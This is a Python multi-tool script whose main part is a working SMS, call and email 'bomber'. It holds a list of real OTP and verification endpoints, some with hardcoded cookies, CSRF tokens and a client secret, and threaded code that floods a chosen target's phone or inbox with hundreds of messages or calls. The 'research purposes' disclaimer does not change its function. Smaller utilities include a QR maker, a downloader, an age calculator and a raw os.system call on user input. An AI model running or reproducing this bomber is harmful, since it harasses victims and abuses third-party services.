                                    "_gid": "GA1.2.969623705.1560660444",
                                    "_gat": "1",
                                    "current_url": "https://indialends.com/personal-loan",
                                    "cookies_plbt": "0"
                                },
                                "headers": {
                                    "Referer": "https://indialends.com/personal-loan"
                                },
                                "data": {
                                    "aeyder03teaeare": "1",
                                    "ertysvfj74sje": "{cc}",
                                    "jfsdfu14hkgertd": "{target}",
                                    "lj80gertdfg": "0"
                                },
                                "identifier": "1"
                            }
                        ],
                        "multi": [
                            {
                                "name": "flipkart",
                                "method": "POST",
                                "cc_target": "loginId",
                                "url": "https://www.flipkart.com/api/5/user/otp/generate",
                                "data": {
                                    "loginId": "+{target}"
                                },
                                "headers": {
                                    "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                                    "Origin": "https://www.flipkart.com",
                                    "Content-Type": "application/x-www-form-urlencoded"
                                },
                                "identifier": "emailMask"
                            },
                            {
                                "name": "qlean",
                                "method": "POST",
                                "url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                                "data": {
                                    "phone": "{cc}{target}"
                                },
                                "identifier": "request_id"
                            },
                            {
                                "name": "mailru",
                                "method": "POST",
                                "url": "https://cloud.mail.ru//api/v2/notify/applink",
                                "data": {
                                    "phone": "+{cc}{target}",
                                    "api": "2",
                                    "email": "email",
                                    "x-email": "x-email"
                                },
                                "identifier": "200"
                            },
                            {
                                "name": "tinder",
                                "method": "POST",
                                "url": "https://api.gotinder.com/v2/auth/sms/send",
                                "params": {
                                    "auth_type": "sms",
                                    "locale": "ru"
                                },
                                "data": {
                                    "phone_number": "{cc}{target}"
                                },
                                "identifier": "200"
                            },
                            {
                                "name": "youla",
                                "method": "POST",
                                "url": "https://youla.ru/web-api/auth/request_code",
                                "data": {
                                    "phone": "+{cc}{target}"
                                },
                                "identifier": ":6"
                            },
                            {
                                "name": "ivi",
                                "method": "POST",
                                "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                                "data": {
                                    "phone": "{cc}{target}"
                                },
                                "identifier": "true"
                            },
                            {
                                "name": "delitime",
                                "method": "POST",
                                "url": "https://api.delitime.ru/api/v2/signup",
                                "data": {
                                    "SignupForm[username]": "{cc}{target}",
                                    "SignupForm[device_type]": "3"
                                },
                                "identifier": "true"
                            },
                            {
                                "name": "icq",
                                "method": "POST",
                                "url": "https://www.icq.com/smsreg/requestPhoneValidation.php",
                                "data": {
                                    "msisdn": "{cc}{target}",
                                    "locale": "en",
                                    "k": "ic1rtwz1s1Hj1O0r",
                                    "r": "45559"
                                },
                                "identifier": "200"
                            },
                            {
                                "name": "ivitv",
                                "method": "POST",
                                "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6/",
                                "data": {
                                    "phone": "{cc}{target}",
                                    "device": "Windows+v.43+Chrome+v.7453451",
                                    "app_version": "870"
                                },
                                "identifier": "true"
                            },
                            {
                                "name": "indialends",
                                "method": "POST",
                                "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
                                "cookies": {
                                    "_ga": "GA1.2.1483885314.1559157646",
                                    "_fbp": "fb.1.1559157647161.1989205138",
                                    "TiPMix": "91.9909185226964",
                                    "gcb_t_track": "SEO - Google",
                                    "gcb_t_keyword": "",
                                    "gcb_t_l_url": "https://www.google.com/",
                                    "gcb_utm_medium": "",
                                    "gcb_utm_campaign": "",
                                    "ASP.NET_SessionId": "ioqkek5lbgvldlq4i3cmijcs",
                                    "web_app_landing_utm_source": "",
                                    "web_app_landing_url": "/personal-loan",
                                    "webapp_landing_referral_url": "https://www.google.com/",
                                    "ARRAffinity": "747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417",
                                    "_gid": "GA1.2.969623705.1560660444",
                                    "_gat": "1",
                                    "current_url": "https://indialends.com/personal-loan",
                                    "cookies_plbt": "0"
                                },
                                "headers": {
                                    "Referer": "https://indialends.com/personal-loan"
                                },
                                "data": {
                                    "aeyder03teaeare": "1",
                                    "ertysvfj74sje": "{cc}",
                                    "jfsdfu14hkgertd": "{target}",
                                    "lj80gertdfg": "0"
                                },
                                "identifier": "1"
                            },
                            {
                                "name": "redbus",
                                "method": "GET",
                                "url": "https://m.redbus.in/api/getOtp",
                                "params": {
                                    "number": "{target}",
                                    "cc": "{cc}",
                                    "whatsAppOpted": false
                                },
                                "identifier": "200"
                            },
                            {
                                "name": "newtonschools",
                                "method": "POST",
                                "url": "https://my.newtonschool.co:443/api/v1/user/otp/",
                                "params": {
                                    "registration": true
                                },
                                "data": {
                                    "phone": "+{cc}{target}"
                                },
                                "identifier": "S003"
                            },
                            {
                                "name": "qiwi",
                                "method": "POST",
                                "url": "https://mobile-api.qiwi.com/oauth/authorize",
                                "data": {
                                    "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                                    "username": "{cc}{target}",
                                    "client_id": "android-qw",
                                    "client_secret": "zAm4FKq9UnSe7id"
                                },
                                "identifier": "confirmation_id"
                            }
                        ]
                    },
                    "call": {
                        "91": [
                            {
                                "name": "makaan",
                                "method": "GET",
                                "url": "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{target}",
                                "params": {
                                    "callType": "otpOnCall"
                                },
                                "identifier": "2XX"
                            },
                            {
                                "name": "realestate",
                                "method": "POST",
                                "url": "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php",
                                "headers": {
                                    "x-requested-with": "XMLHttpRequest",
                                    "referer": "https://www.realestateindia.com/thanks.php?newreg"
                                },
                                "cookies": {
                                    "visitedToken": "176961560836367"
                                },
                                "params": {
                                    "sid": "0.5983221395805354"
                                },
                                "data": {
                                    "action_id": "call_to_otp",
                                    "mob_num": "{target}",
                                    "member_id": "1547045"
                                },
                                "identifier": "Y"
                            },
                            {
                                "name": "magicbricks",
                                "method": "GET",
                                "url": "https://api.magicbricks.com/bricks/verifyOnCall.html",
                                "params": {
                                    "mobile": "{target}"
                                },
                                "identifier": "callmade"
                            },
                            {
                                "name": "career360",
                                "method": "POST",
                                "url": "https://www.careers360.com/ajax/no-cache/user/otp-send",
                                "cookies": {
                                    "_gcl_au": "1.1.1168325424.1600579108",
                                    "WZRK_G": "4584ba1e8345400d92392a88464c9183",
                                    "__asc": "ce35392c174a9f2fbe2f2c29a0c",
                                    "__auc": "ce35392c174a9f2fbe2f2c29a0c",
                                    "_ga": "GA1.2.1646044729.1600579108",
                                    "_gid": "GA1.2.365026440.1600579108",
                                    "_fbp": "fb.1.1600579107930.1446075664",
                                    "dataLayer_": "Home Pages",
                                    "csrftoken": "RI5TGK7tuZdkJjVNzu3lRdSeRcztdtYqfsLmngbNRK1lMH7Uir1qFprpSgCI2ZNy",
                                    "_omappvp": "RIeaJ0pgkcvqwRygRT8VTxJ6PrpnRvze6xwTpZBXztsuBXhgRV5OIU97g9s0DivdxwVAHM0DF1teulefRfsK0wCo2MRjp325",
                                    "G_ENABLED_IDPS": "google",
                                    "_dc_gtm_UA-46098128-1": "1",
                                    "_omappvs": "1600579353765",
                                    "WZRK_S_654-ZZ4-5Z5Z": "%7B%22p%22%3A5%2C%22s%22%3A1600579103%2C%22t%22%3A1600579356%7D"
                                },
                                "headers": {
                                    "X-CSRFToken": "9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj",
                                    "X-Requested-With": "XMLHttpRequest",
                                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                                    "Origin": "https://www.careers360.com",
                                    "Sec-Fetch-Site": "same-origin",
                                    "Sec-Fetch-Mode": "cors",
                                    "Sec-Fetch-Dest": "empty",
                                    "Referer": "https://www.careers360.com/user/otp-verify/101e8d6e591af6688f640eee08f5a5f8?destination=&click_location=header&google_success=header"
                                },
                                "data": {
                                    "mobile_number": "{target}",
                                    "method": "call",
                                    "uid": "12692588"
                                },
                                "identifier": "success"
                            }
                        ],
                        "multi": []
                    },
                    "mail": {
                        "multi": [
                            {
                                "name": "themezee",
                                "method": "POST",
                                "url": "https://themezee.com/wp-admin/admin-ajax.php?action=mc4wp-form",
                                "data": {
                                    "EMAIL": "{target}",
                                    "AGREE": "1",
                                    "_mc4wp_honeypot": "",
                                    "_mc4wp_timestamp": "1614865641",
                                    "_mc4wp_form_id": "184963",
                                    "_mc4wp_form_element_id": "mc4wp-form-1"
                                },
                                "identifier": "mc4wp-success"
                            },
                            {
                                "name": "credible_init",
                                "method": "POST",
                                "url": "https://mycredible.info:443/mycredible/signup",
                                "data": {
                                    "email": "{target}",
                                    "first_name": "Lex",
                                    "last_name": "Luthor"
                                },
                                "identifier": "ccuid"
                            },
                            {
                                "name": "credible_mail",
                                "method": "GET",
                                "url": "https://mycredible.info:443/mycredible/signin/request_otp",
                                "params": {
                                    "email": "{target}"
                                },
                                "identifier": ""
                            }
                        ]
                    }
                }

            class APIProvider:

                api_providers = []
                delay = 0
                status = True

                def __init__(self, cc, target, mode, delay=0):
                    try:
                        PROVIDERS = json_data()
                    except Exception:
                        PROVIDERS = requests.get(
                            "https://github.com/TheSpeedX/TBomb/raw/master/apidata.json"
                        ).json()
                    self.config = None
                    self.cc = cc
                    self.target = target
                    self.mode = mode
                    self.index = 0
                    self.lock = threading.Lock()
                    self.api_version = PROVIDERS.get("version", "2")
                    APIProvider.delay = delay
                    providers = PROVIDERS.get(mode.lower(), {})
                    APIProvider.api_providers = providers.get(cc, [])
                    if len(APIProvider.api_providers) < 10:
                        APIProvider.api_providers += providers.get("multi", [])

                def format(self):
                    config_dump = json.dumps(self.config)
                    config_dump = config_dump.replace("{target}", self.target)
                    config_dump = config_dump.replace("{cc}", self.cc)
                    self.config = json.loads(config_dump)

                def select_api(self):
                    try:
                        if len(APIProvider.api_providers) == 0:
                            raise IndexError
                        self.index += 1
                        if self.index >= len(APIProvider.api_providers):
                            self.index = 0
                    except IndexError:
                        self.index = -1
                        return
                    self.config = APIProvider.api_providers[self.index]
                    perma_headers = {"User-Agent":
                                         "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)"
                                         " Gecko/20100101 Firefox/72.0"}
                    if "headers" in self.config:
                        self.config["headers"].update(perma_headers)
                    else:
                        self.config["headers"] = perma_headers
                    self.format()

                def remove(self):
                    try:
                        del APIProvider.api_providers[self.index]
                        return True
                    except Exception:
                        return False

                def request(self):
                    self.select_api()
                    if not self.config or self.index == -1:
                        return None
                    identifier = self.config.pop("identifier", "").lower()
                    del self.config['name']
                    self.config['timeout'] = 30
                    response = requests.request(**self.config)
                    return identifier in response.text.lower()

                def hit(self):
                    try:
                        if not APIProvider.status:
                            return
                        time.sleep(APIProvider.delay)
                        self.lock.acquire()
                        response = self.request()
                        if response is False:
                            self.remove()
                        elif response is None:
                            APIProvider.status = False
                        return response
                    except Exception:
                        response = False
                    finally:
                        self.lock.release()
                        return response

            class IconicDecorator(object):
                def __init__(self):
                    self.PASS = Style.BRIGHT + Fore.GREEN + "[ ✔ ]" + Style.RESET_ALL
                    self.FAIL = Style.BRIGHT + Fore.RED + "[ ✘ ]" + Style.RESET_ALL
                    self.WARN = Style.BRIGHT + Fore.YELLOW + "[ ! ]" + Style.RESET_ALL
                    self.HEAD = Style.BRIGHT + Fore.CYAN + "[ # ]" + Style.RESET_ALL
                    self.CMDL = Style.BRIGHT + Fore.BLUE + "[ → ]" + Style.RESET_ALL
                    self.STDS = "     "

            class StatusDecorator(object):
                def __init__(self):
                    self.PASS = Style.BRIGHT + Fore.GREEN + "[ SUCCESS ]" + Style.RESET_ALL
                    self.FAIL = Style.BRIGHT + Fore.RED + "[ FAILURE ]" + Style.RESET_ALL
                    self.WARN = Style.BRIGHT + Fore.YELLOW + "[ WARNING ]" \
                                + Style.RESET_ALL
                    self.HEAD = Style.BRIGHT + Fore.CYAN + "[ SECTION ]" + Style.RESET_ALL
                    self.CMDL = Style.BRIGHT + Fore.BLUE + "[ COMMAND ]" + Style.RESET_ALL
                    self.STDS = "           "

            class MessageDecorator(object):
                def __init__(self, attr):
                    ICON = IconicDecorator()
                    STAT = StatusDecorator()
                    if attr == "icon":
                        self.PASS = ICON.PASS
                        self.FAIL = ICON.FAIL
                        self.WARN = ICON.WARN
                        self.HEAD = ICON.HEAD
                        self.CMDL = ICON.CMDL
                        self.STDS = ICON.STDS
                    elif attr == "stat":
                        self.PASS = STAT.PASS
                        self.FAIL = STAT.FAIL
                        self.WARN = STAT.WARN
                        self.HEAD = STAT.HEAD
                        self.CMDL = STAT.CMDL
                        self.STDS = STAT.STDS

                def SuccessMessage(self, RequestMessage):
                    print(self.PASS + " " + Style.RESET_ALL + RequestMessage)

                def FailureMessage(self, RequestMessage):
                    print(self.FAIL + " " + Style.RESET_ALL + RequestMessage)

                def WarningMessage(self, RequestMessage):
                    print(self.WARN + " " + Style.RESET_ALL + RequestMessage)

                def SectionMessage(self, RequestMessage):
                    print(self.HEAD + " " + Fore.CYAN + Style.BRIGHT
                          + RequestMessage + Style.RESET_ALL)

                def CommandMessage(self, RequestMessage):
                    return self.CMDL + " " + Style.RESET_ALL + RequestMessage

                def GeneralMessage(self, RequestMessage):
                    print(self.STDS + " " + Style.RESET_ALL + RequestMessage)

            def get_version():
                "2.1.2"

            def clr():
                if os.name == "nt":
                    os.system("cls")
                else:
                    os.system("clear")

            def check_intr():
                try:
                    requests.get("https://google.com")
                except Exception:
                    mesgdcrt.FailureMessage(Fore.RED + "Poor internet connection detected")
                    real_python()

            def format_phone(num):
                num = [n for n in num if n in string.digits]
                return ''.join(num).strip()

            def get_phone_info():
                while True:
                    target = ""
                    cc = input(mesgdcrt.CommandMessage(Fore.GREEN +
                                                       "Enter your country code (Without +): "))
                    cc = format_phone(cc)
                    if cc not in dd:
                        mesgdcrt.WarningMessage(Fore.RED +
                                                "The country code ({cc}) that you have entered"
                                                " is invalid or unsupported".format(cc=cc))
                        continue
                    target = input(mesgdcrt.CommandMessage(Fore.GREEN +
                                                           "Enter the target number: +" + cc + " "))
                    target = format_phone(target)
                    if ((len(target) <= 6) or (len(target) >= 12)):
                        mesgdcrt.WarningMessage(Fore.RED +
                                                "The phone number ({target})".format(target=target) +
                                                "that you have entered is invalid")
                        continue
                    return (cc, target)

            def pretty_print(cc, target, success, failed):
                requested = success + failed
                mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
                mesgdcrt.GeneralMessage(
                    "Please stay connected to the internet during bombing")
                mesgdcrt.GeneralMessage("Target       : " + cc + " " + target)
                mesgdcrt.GeneralMessage("Sent         : " + str(requested))
                mesgdcrt.GeneralMessage("Successful   : " + str(success))
                mesgdcrt.GeneralMessage("Failed       : " + str(failed))
                mesgdcrt.WarningMessage(
                    "This tool was made for fun and research purposes only")
                mesgdcrt.SuccessMessage("Bomber was created by Xcoder")
                contact()

            def workernode(mode, cc, target, count, delay, max_threads):

                api = APIProvider(cc, target, mode, delay=delay)
                clr()
                mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
                mesgdcrt.GeneralMessage(
                    "Please stay connected to the internet during bombing")
                mesgdcrt.GeneralMessage("API Version   : " + api.api_version)
                mesgdcrt.GeneralMessage("Target        : " + cc + target)
                mesgdcrt.GeneralMessage("Amount        : " + str(count))
                mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
                mesgdcrt.GeneralMessage("Delay         : " + str(delay) +
                                        " seconds")
                mesgdcrt.WarningMessage(
                    "This tool was made for fun and research purposes only")
                print()
                input(mesgdcrt.CommandMessage(
                    "Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))

                if len(APIProvider.api_providers) == 0:
                    mesgdcrt.FailureMessage(Fore.RED + "Your country/target is not supported yet")
                    mesgdcrt.GeneralMessage(Fore.RED + "Feel free to reach out to us or contact us")
                    contact()
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                    real_python()

                success, failed = 0, 0
                while success < count:
                    with ThreadPoolExecutor(max_workers=max_threads) as executor:
                        jobs = []
                        for i in range(count - success):
                            jobs.append(executor.submit(api.hit))

                        for job in as_completed(jobs):
                            result = job.result()
                            if result is None:
                                mesgdcrt.FailureMessage(Fore.RED +
                                                        "Bombing limit for your target has been reached")
                                mesgdcrt.GeneralMessage(Fore.RED + "Try Again Later !!")
                                input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                                real_python()
                            if result:
                                success += 1
                            else:
                                failed += 1
                            clr()
                            pretty_print(cc, target, success, failed)
                print("\n")
                mesgdcrt.SuccessMessage(Fore.GREEN + "Bombing completed!")
                time.sleep(1.5)
                real_python()

            def selectnode(mode="sms"):
                mode = mode.lower().strip()
                try:
                    clr()
                    check_intr()
                    banner()

                    max_limit = {"sms": 500, "call": 15, "mail": 200}
                    cc, target = "", ""
                    if mode in ["sms", "call"]:
                        cc, target = get_phone_info()
                        if cc != "91":
                            max_limit.update({"sms": 100})
                    elif mode == "mail":
                        target = get_mail_info()
                    else:
                        raise KeyboardInterrupt

                    limit = max_limit[mode]
                    while True:
                        try:
                            message = ("Enter number of {type}".format(type=mode.upper()) +
                                       " to send (Max {limit}): ".format(limit=limit))
                            count = int(input(mesgdcrt.CommandMessage(message)).strip())
                            if count > limit or count == 0:
                                mesgdcrt.WarningMessage("You have requested " + str(count)
                                                        + " {type}".format(
                                    type=mode.upper()))
                                mesgdcrt.GeneralMessage(
                                    "Automatically capping the value"
                                    " to {limit}".format(limit=limit))
                                count = limit
                            delay = float(input(
                                mesgdcrt.CommandMessage("Enter delay time (in seconds): "))
                                          .strip())
                            # delay = 0
                            max_thread_limit = (count // 10) if (count // 10) > 0 else 1
                            max_threads = int(input(
                                mesgdcrt.CommandMessage(
                                    "Enter Number of Thread (Recommended: {max_limit}): "
                                        .format(max_limit=max_thread_limit)))
                                              .strip())
                            max_threads = max_threads if (
                                    max_threads > 0) else max_thread_limit
                            if (count < 0 or delay < 0):
                                raise Exception
                            break
                        except KeyboardInterrupt as ki:
                            raise ki
                        except Exception:
                            mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
                            print()

                    workernode(mode, cc, target, count, delay, max_threads)
                except KeyboardInterrupt:
                    mesgdcrt.WarningMessage("Received INTR call - Exiting...")
                    real_python()

            mesgdcrt = MessageDecorator("icon")
            if sys.version_info[0] != 3:
                mesgdcrt.FailureMessage("Bomber will work only in Python v3")
                real_python()

            __VERSION__ = get_version()
            __CONTRIBUTORS__ = ['Xcoder', 'SpeedX', '']

            ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE,
                          Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
            RESET_ALL = Style.RESET_ALL

            ASCII_MODE = False
            DEBUG_MODE = False

            description = """Bomber - Your Friendly Spammer Application
            Bomber can be used for many purposes which incudes -
            \t Exposing the vulnerable APIs over Internet
            \t Friendly Spamming
            \t Testing Your Spam Detector and more ....
            Bomber is not intented for malicious uses.
            """

            parser = argparse.ArgumentParser(description=description,
                                             epilog='Coded by Xcoder !!!')
            parser.add_argument("-sms", "--sms", action="store_true",
                                help="start Bomber with SMS Bomb mode")
            parser.add_argument("-call", "--call", action="store_true",
                                help="start Bomber with CALL Bomb mode")
            parser.add_argument("-mail", "--mail", action="store_true",
                                help="start Bomber with MAIL Bomb mode")
            parser.add_argument("-ascii", "--ascii", action="store_true",
                                help="show only characters of standard ASCII set")
            parser.add_argument("-u", "--update", action="store_true",
                                help="update Bomber")
            parser.add_argument("-c", "--contributors", action="store_true",
                                help="show current Bomber contributors")
            parser.add_argument("-v", "--version", action="store_true",
                                help="show current Bomber version")

            if __name__ == "__main__":
                args = parser.parse_args()
                if args.ascii:
                    ASCII_MODE = True
                    mesgdcrt = MessageDecorator("stat")
                if args.version:
                    print("Version: ", __VERSION__)
                elif args.contributors:
                    print("Contributors: ", " ".join(__CONTRIBUTORS__))
                elif args.update:
                    pass
                elif args.mail:
                    selectnode(mode="mail")
                elif args.call:
                    selectnode(mode="call")
                elif args.sms:
                    selectnode(mode="sms")
                else:
                    choice = ""
                    avail_choice = {
                        "1": "SMS",
                        "2": "CALL",
                        "3": "MAIL"
                    }
                    try:
                        while (choice not in avail_choice):
                            clr()
                            print("Available Options:\n")
                            for key, value in avail_choice.items():
                                print("[ {key} ] {value} BOMB".format(key=key,
                                                                      value=value))
                            print()
                            choice = input(mesgdcrt.CommandMessage("Enter Choice : "))
                        selectnode(mode=avail_choice[choice].lower())
                    except KeyboardInterrupt:
                        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
                        real_python()
                real_python()

        def create_qr():
            if (check_internet()) == True:
                user_input = input("Enter Url or Secret Text: ")
                user_input_name = input("Enter png file name: ")
                path = "Your_data/Your_Qr_Code/"+user_input_name+".png"
                create_folder()

                qr = qrcode.QRCode(version=1,
                                   box_size=10,
                                   border=5)
                qr.add_data(user_input)

                qr.make(fit=True)
                # change your color as your choise (fill_color='red')
                img = qr.make_image(fill_color='red',
                                    back_color='white')

                img.save(path)
                print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                time.sleep(2)
                real_python()
            else:
                print(Fore.RED + "Plz Check Your internet Connection And try Again")
                time.sleep(3)
                real_python()

        def open_aplication():
            loation = input("Enter Application or File Loaction: ")
            os.system(loation)

        def install_Module():
            if (check_internet()) == True:
                try:
                    quantity = input("How Many Module you want to Install: ")
                    quantity = int(quantity)
                except :
                    print("Error: PLz Input Correct Number")
                    install_Module()
                test_list = ["pip"]
                time.sleep(3)
                for a in range(quantity):
                    input_module = " " + input("Enter Module Name: ")
                    test_list.append(input_module)
                number_of_module = len(test_list)
                for mod in range(number_of_module):
                    print("Downloading Module.........plz wait")
                    pip_data = 0
                    pip_data1 = 1
                    print(test_list[pip_data:pip_data1])
                    pip_data = pip_data + 1
                    pip_data1 = pip_data1 + 1
                    pip.main(['install'] + test_list + ['--upgrade'])
                    time.sleep(0.01)
                    clear1()
                    module_size = 0
                    print("Installed: ", test_list.pop(module_size))
                    module_size = module_size + 1
                real_python()
            else:
                print(Fore.RED + "Plz Check Your internet Connection And try Again")
                time.sleep(3)
                real_python()

        def install_some():
            try:
                file_url = input("Enter Url Of File or Video or Anythings : ")
                file_name = input("Enter File Name : ")
                file_exet = "." + input("Enter File Extention without dot : ")
                r = requests.get(file_url)
                create_folder()
                with open("Your_data/Your_Downloaded_Files/" + file_name + file_exet, 'wb') as f:
                    f.write(r.content)
                    print(Fore.YELLOW + "Success...!")
                    print(Fore.RED + 'Your File is On ', "'Your_data'", ' Folder')
                time.sleep(2)
                real_python()
            except :
                print(Fore.RED + "Plz Check Your internet Connection And try Again")
                time.sleep(3)
                real_python()

        def tell_age():
            try:

                print("##### Welcome to age calculator ######")
                birth_year = int(input("Enter your year of birth: \n"))
                birth_month = int(input("Enter your month of birth: \n"))
                birth_day = int(input("Enter your day of birth: \n"))
                birth_hour = input("Enter Hour(If you don't know, leave it): ")
                birth_min = input("Enter Minute(If you don't know, leave it): ")
                birth_sec = input("Enter Second(If you don't know, leave it): ")
                try:
                    birth_hour = int(birth_hour)
                except ValueError:
                    birth_hour = 0
                try:
                    birth_min = int(birth_min)
                except ValueError:
                    birth_min = 0
                try:
                    birth_sec = int(birth_sec)
                except ValueError:
                    birth_sec = 0

                def press_enter_exit():
                    global value_dat
                    press_me = input("Press enter to exit: ")
                    value_dat = 1
                    real_python()

                def for_current_time():
                    todays_date = date.today()
                    now = datetime.now()
                    current_year = todays_date.year
                    current_month = todays_date.month
                    current_day = todays_date.day
                    current_hour = int(now.strftime("%H"))
                    current_min = int(now.strftime("%M"))
                    current_sec = int(now.strftime("%S"))
                    age_year = current_year - birth_year
                    age_month = abs(current_month - birth_month)
                    age_day = abs(current_day - birth_day)
                    age_hour = abs(current_hour - birth_hour)
                    age_min = abs(current_min - birth_min)
                    age_sec = abs(current_sec - birth_sec)
                    print("\nYour exact age is: ", age_year, "Years", age_month, "months ", age_day, "days", age_hour,
                          "hour", age_min, "minute and ", age_sec, "second\n")
                    threading.Thread(target=press_enter_exit).start()
                    clear1()
            except ValueError:
                print("Error: input correct numbers ")
                tell_age()
            while value_dat == 0:
                threading.Thread(target=for_current_time).start()
                time.sleep(1)
                clear1()

        input_user = input("Input: ")
        if input_user == "1":
            contact()
            calculator()
        if input_user == "2":
            contact()
            bat()
        if input_user == "3":
            contact()
            if check_internet() == True:
                bomber()
            else:
                print(Fore.RED + "Poor internet connection detected")
                real_python()
        if input_user == "4":
            contact()
            if check_internet() == True:
                create_qr()
            else:
                print(Fore.RED + "Poor internet connection detected")
        if input_user == "5":
            contact()
            open_aplication()
        if input_user == "6":
            contact()
            if check_internet() == True:
                install_Module()
            else:
                print(Fore.RED + "Poor internet connection detected")
        if input_user == "7":
            contact()
            if check_internet() == True:
                install_some()
            else:
                print(Fore.RED + "Poor internet connection detected")
        if input_user == "8":
            contact()
            tell_age()
        if input_user == "y" or input_user == "Y":
            web()
            real_python()
        else:
            print(Fore.RED + "Error: Input Only Given Numbers")
            full()

    full()


real_python()

# Xcoder
